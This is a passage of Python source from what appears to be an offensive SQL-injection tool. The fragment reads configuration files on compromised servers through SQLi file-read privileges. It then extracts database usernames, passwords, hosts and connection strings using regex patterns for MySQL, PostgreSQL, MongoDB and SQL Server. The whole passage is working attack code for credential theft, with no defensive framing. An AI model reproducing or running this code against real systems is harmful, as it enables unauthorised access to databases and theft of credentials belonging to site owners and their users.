                       f"user={creds['db_user']}, db={creds['db_name']}, "
                       f"host={creds['db_host']}")
            return creds

        # Also look for connection strings
        # Use (.+) for password to handle passwords containing @ (greedy backtracks to last @)
        conn_patterns = [
            re.compile(r"mysql://([^:]+):(.+)@([^@/]+(?::\d+)?)/(\w+)", re.I),
            re.compile(r"postgres(?:ql)?://([^:]+):(.+)@([^@/]+(?::\d+)?)/(\w+)", re.I),
            re.compile(r"mongodb(?:\+srv)?://([^:]+):(.+)@([^@/]+(?::\d+)?)", re.I),
            re.compile(r"Server=([^;]+);.*?Database=([^;]+);.*?User[^=]*=([^;]+);.*?Password=([^;]+)", re.I),
        ]
        for pattern in conn_patterns:
            match = pattern.search(content)
            if match:
                groups = match.groups()
                if len(groups) >= 3:
                    return {
                        "db_user": groups[0],
                        "db_pass": groups[1],
                        "db_host": groups[2],
                        "db_name": groups[3] if len(groups) > 3 else "",
                        "connection_string": match.group(0)[:200],
                    }

        return None

    @classmethod
    async def extract_and_parse_configs(
        cls,
        sqli_result,
        dumper,
        session: aiohttp.ClientSession,
        existing_file_reads: Dict[str, str] = None,
    ) -> List[Dict]:
        """Read config files via SQLi FILE priv and extract DB credentials.

        Args:
            sqli_result: SQLi with FILE privilege
            dumper: SQLiDumper instance
            existing_file_reads: Already-read files from auto_file_read()

        Returns:
            List of credential dicts found in config files
        """
        all_creds = []

        # Parse any already-read files
        if existing_file_reads:
            for filepath, content in existing_file_reads.items():
                creds = cls.parse_credentials(filepath, content)
                if creds:
                    creds["source_file"] = filepath
                    all_creds.append(creds)

        # Read additional config files
        for filepath in cls.EXTRA_CONFIG_FILES:
            # Skip if already read
            if existing_file_reads and filepath in existing_file_reads:
                continue

            try:
                content = await dumper.read_file(sqli_result, filepath, session)
                if content and len(content) > 10:
                    creds = cls.parse_credentials(filepath, content)
                    if creds:
                        creds["source_file"] = filepath
                        all_creds.append(creds)
                        logger.info(f"[ConfigCreds] Found credentials in {filepath}")
            except Exception as e:
                logger.debug(f"[ConfigCreds] Failed to read {filepath}: {e}")

            await asyncio.sleep(0.2)

            # Stop after finding 3 credential sets — enough
            if len(all_creds) >= 3:
                break

        return all_creds
